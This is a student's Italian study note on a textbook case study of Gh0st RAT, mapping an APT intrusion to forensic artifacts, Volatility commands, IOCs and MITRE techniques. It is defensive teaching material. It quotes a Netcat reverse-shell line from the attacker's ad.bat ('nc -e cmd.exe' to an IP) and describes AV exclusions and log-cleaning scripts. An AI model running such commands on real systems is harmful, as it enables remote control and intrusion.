## tags: [ethical-hacking, he7, ch6, apt, case-study, forensics, rat] aliases: [gh0st_rat, gh0stnet]

# Gh0st RAT — case study

> HE7 Ch.6, primo case study dettagliato. È lo **specchio del difensore** di `[[apt]]`: la nota `[[apt]]` descrive il lifecycle dal lato attaccante, questo case study mostra come ogni fase **lascia artefatti** che l'investigatore recupera. Il valore non è memorizzare i comandi, è vedere il _mapping azione → artefatto → tool_.

## Cos'è Gh0st RAT

Un **RAT** (Remote Administration Tool) — controllo remoto completo dell'host. Usato negli attacchi **"Gh0stNet" (2008-2010)**: l'Information Warfare Monitor pubblicò il report _Tracking Gh0stNet_ documentando la compromissione dei sistemi dell'ufficio del Dalai Lama e del governo tibetano in esilio; attacchi attribuiti alla Cina. È diventato _l'esempio da manuale_ di malware per APT.

Capacità (Table 6-1, in sintesi): keystroke logger, screen/webcam/microfono spying, remote shell, file manager, screen blanking, input blocking, **custom server builder** (genera binari server configurabili). Una capacità interessante: _"existing rootkit removal — clears the SSDT of all existing hooks"_ — la SSDT (System Service Descriptor Table) è la syscall table di Windows; Gh0st **rimuove gli hook di rootkit concorrenti** → comportamento territoriale, "questa box è mia". Collega a `[[kernel_rootkits]]` (interception via syscall table).

## Lo scenario

Charles riceve un'email indirizzata al reparto Finance su un bonifico fallito, con un link a un "report d'errore". Clicca → pagina bianca _"Wait please… loading……"_. Più tardi il PC è stato sequestrato dalla sicurezza: traffico di rete sospetto in uscita dalla sua macchina.

## L'attacco ricostruito — mappato sul lifecycle `[[apt]]`

|Fase APT|Cosa ha fatto l'attaccante|
|---|---|
|1 Targeting|spear-phishing al reparto Finance (email "Jessica Long / TEPA")|
|2 Access|la vittima clicca → dropper `server.exe` in `%TEMP%`, backdoor `6to4ex.dll` dentro `svchost.exe`|
|3 Recon|enumerazione del dominio dai log; `net.exe` per gli account|
|4 Lateral movement|`mstsc.exe` (Terminal Server / RDP) per saltare su HRserver e sul Domain Controller|
|5 Collection & exfil|`ad.bat` raccoglie documenti, li impacchetta in `d.rar`/zip; `ftp.exe` per l'uscita|
|6 Admin & maintenance|account `Ch1n00k` aggiunto agli Administrators; secondo backdoor con Netcat; `cleanup.bat` schedulato ogni notte alle 23:30 per pulire i log|

> [!tip] Filo conduttore — è la tesi di `[[apt]]` resa concreta "Tecniche invisibili, artefatti no": ogni azione qui sopra è low-profile (usa tool nativi), ma **ognuna lascia una traccia**. L'intera indagine è il difensore che raccoglie quelle tracce e le ricuce in una timeline. E nota il **LOTL** ovunque — `net.exe`, `mstsc.exe`, `ftp.exe`, `cmd.exe`, RDP: zero tool "da hacker", tutto roba da sysadmin usata con intento ostile.

## L'indagine — workflow forense per ordine di volatilità

L'investigazione segue l'**ordine di volatilità RFC 3227**. Sintesi dei passaggi:

**Email malevola (il punto di partenza).** L'azienda è USA ma il link è un dominio `.de` → primo campanello. Header analysis con WHOIS, Robtex, PhishTank → l'IP è tedesco e in blacklist per spam. Dominio: `finiancialservicesc0mpany.de` (typosquatting — nota lo `0` al posto della `o`).

**Memoria (più volatile → primo).** Cattura con FTK Imager → analisi offline con **Volatility**:

|Comando Volatility|Cosa rivela|
|---|---|
|`imageinfo`|identifica il profilo OS del dump|
|`pslist`|elenco processi|
|`connscan`|connessione sospetta verso il C2 — PID 1024, `svchost.exe`, porta 80|
|`dlllist -p 1024`|le DLL caricate da quel processo|
|`dlldump -p 1024`|estrae le DLL → trova `6to4ex.dll`|
|`apihooks -p 1024`|conferma che il processo è hookato|
|`malfind -p 1024`|rileva codice iniettato/nascosto in memoria|

`strings` su `6to4ex.dll` → la path `E:\gh0st\server\sys\i386\RESSDT.pdb`. Punto chiave del libro: **l'analisi di memoria vanifica injection e offuscamento** — file e comunicazioni _devono_ essere in chiaro dentro i processi che li usano.

**Pagefile/Hiberfil, MFT.** Il `Pagefile.sys` e `Hiberfil.sys` contengono memoria riversata su disco. La **Master File Table** (record di ogni file NTFS) dà timestamp e metadata → rivela che il dropper `server.exe` è stato creato in `%TEMP%` del profilo `Ch1n00k` alle 9:43 del 19/2.

**Rete / processi / registry (live).**

- `netstat -ano` → connessione sospetta, PID 1040.
- **Hosts file** — baseline 734 byte; qualsiasi aumento è sospetto.
- **Currports** → conferma: `svchost` PID 1040, porta 80, modulo `6to4ex.dll`.
- **Process Explorer** → tab Services: il servizio `6to4` ha descrizione _"Monitors USB Service Components"_ e display name _"Microsoft Device Manager"_. **Tre incoerenze** → masquerading (T1036.004), vedi anche `[[trojan_binaries]]`. `cmd.exe` lanciato periodicamente = attaccante attivo.
- **Process Monitor** → interazioni col kernel; thread creato, traffico C2 su HTTP, esecuzione di `cmd.exe`; entry nel **Prefetch**.
- **VMMap** → `strings` su `6to4ex.dll`: `Gh0st Update`, `?AVCScreenSpy`, `?AVCKeyboardmanager`, `SetWindowsHookExA`, `Global\Gh0st %d` → conferma che è Gh0st RAT.
- **DNS cache** (`ipconfig /displaydns`) → la richiesta a `finiancialservicesc0mpany.de` (il dominio del phishing).
- **Registry** — `reg query` sulle Run key, RunOnce, e la chiave Services (nomi/path/descrizioni anomale).
- **Scheduled tasks** (`at`, `schtasks`) → un task esegue `cleanup.bat` ogni giorno alle 23:30.
- **Event Logs** (`psloglist`) → la timeline d'oro: `cmd.exe` creato, `net.exe` usato, account `Ch1n00k` aggiunto agli Administrators, `mstsc.exe` (RDP), `ftp.exe`. Security Event ID **636** e **593**.
- **Prefetch** — record degli ultimi 128 programmi unici eseguiti.

**File interessanti.** `ntuser.dat` (profilo utente), `index.dat` (URL richiesti), file `.rdp`, file `.bmc`, log AV.

- I file **`.rdp`** (XML) → l'attaccante si è connesso via RDP a `HRserver` e `AD.commercialcompany.com` = lateral movement verso il Domain Controller.
- I file **`.bmc`** = cache delle bitmap RDP → con BMC Viewer puoi **ricostruire ciò che l'attaccante vedeva** sullo schermo remoto.

**Diff di `System32`** contro la cache di installazione → file aggiunti: `6to4ex.dll`, `cleanup.bat`, `ad.bat`, `d.rar`, `1.txt`.

- `cleanup.bat` → pulizia dei log (anti-forensics, vedi `[[log_cleaning]]`).
- `ad.bat` → raccolta dati dal dominio; contiene `nc -e cmd.exe 192.168.3.39` (Netcat come backdoor) e copia dei `.doc` in uno zip.
- `1.txt` → lista di password comuni (`123456`, `p@ssw0rd`, `letmein`...) = wordlist per password spraying.

**Log antivirus.** Netcat non era stato rilevato → gli attaccanti avevano creato un'**esclusione AV per Netcat** _prima_ di copiarlo. È **T1562.001 Disable or Modify Tools** — la mossa moderna di `[[log_cleaning]]` ("accecare il collector"). In più: cambiano la **firma del file** con packing/XOR custom per eludere AV e IDS.

**Rete.** Wireshark filtrato sul C2 → ogni pacchetto da/verso il C2 inizia coi byte `Gh0st` → firma `\x47\x68\x30\x73\x74` → da cui una **regola SNORT** per bloccare il traffico.

## Tabella IOC — artefatto → azione → fase

|Artefatto trovato|Cosa rivela|Fase APT|
|---|---|---|
|Email `.de` per azienda USA, typosquatting|spear-phishing|1|
|`server.exe` dropper in `%TEMP%` (MFT)|initial compromise|2|
|`6to4ex.dll` dentro `svchost`, servizio `6to4` mascherato|backdoor + persistenza via servizio|2 / 6|
|Connessione `svchost`→C2 porta 80 (Volatility, netstat, Currports)|command & control|tutte|
|Event log: `net.exe`, account `Ch1n00k` → Administrators|account creation, recon|3 / 6|
|File `.rdp`, `.bmc`, `mstsc.exe` nei log|lateral movement via RDP verso AD/HRserver|4|
|`ad.bat`, `d.rar`, zip di `.doc`, `ftp.exe`|data collection & exfiltration|5|
|`cleanup.bat` schedulato alle 23:30|log cleaning / anti-forensics|6|
|Netcat + esclusione AV creata|secondo backdoor + impair defenses|6|

## Stato moderno (2026)

- **Gh0st RAT** — il codice sorgente è trapelato da anni → centinaia di varianti; è uno dei RAT più "forkati" della storia, ancora visto in campagne recenti.
- Il concetto di RAT si è evoluto nei **C2 framework**: Cobalt Strike (commerciale, dilagato nel crimine), e gli open-source Sliver, Havoc, Mythic.
- **Volatility 3** ha rimpiazzato la versione del libro (riscritta in Python 3). Il workflow di memory forensics è più centrale che mai per via del malware fileless.
- La **firma a byte fissi** (`Gh0st` → SNORT rule) è obsoleta: il C2 moderno usa TLS, domain fronting, servizi cloud legittimi (C2 su GitHub/Slack/Discord). La detect si fa con fingerprinting TLS (JA3/JARM) e analisi comportamentale.
- **Contaminazione**: HE7 fa girare i tool _sulla macchina viva_ (`netstat`, `reg query`...). Best practice moderna: cattura memoria + immagine disco, analizza offline — e se c'è un `[[kernel_rootkits]]`, i tool live mentono comunque.
- **L'abuso delle esclusioni AV** è ancora enorme — aggiungere esclusioni a Defender è una delle prime mosse del malware moderno (T1562.001).

## Mapping MITRE ATT&CK

|Tecnica|ID|
|---|---|
|Phishing: Spearphishing Link|T1566.002|
|User Execution: Malicious Link|T1204.001|
|Create or Modify System Process: Windows Service|T1543.003|
|Masquerading: Match Legitimate Name or Location|T1036.004|
|Input Capture: Keylogging|T1056.001|
|Remote Services: RDP|T1021.001|
|Create Account: Local Account|T1136.001|
|Application Layer Protocol: Web Protocols (C2)|T1071.001|
|Indicator Removal (`cleanup.bat`)|T1070|
|Impair Defenses: Disable or Modify Tools (esclusione AV)|T1562.001|
|Obfuscated Files or Information (packing XOR)|T1027|

## Collegamenti

- È il lifecycle di `[[apt]]` reso concreto dal lato difensore
- Servizio mascherato `6to4` → masquerading, come rathole in `[[trojan_binaries]]`
- `cleanup.bat` + esclusione AV → `[[log_cleaning]]`
- Gh0st che pulisce la SSDT → syscall table in `[[kernel_rootkits]]`
- L'ordine di raccolta segue l'ordine di volatilità RFC 3227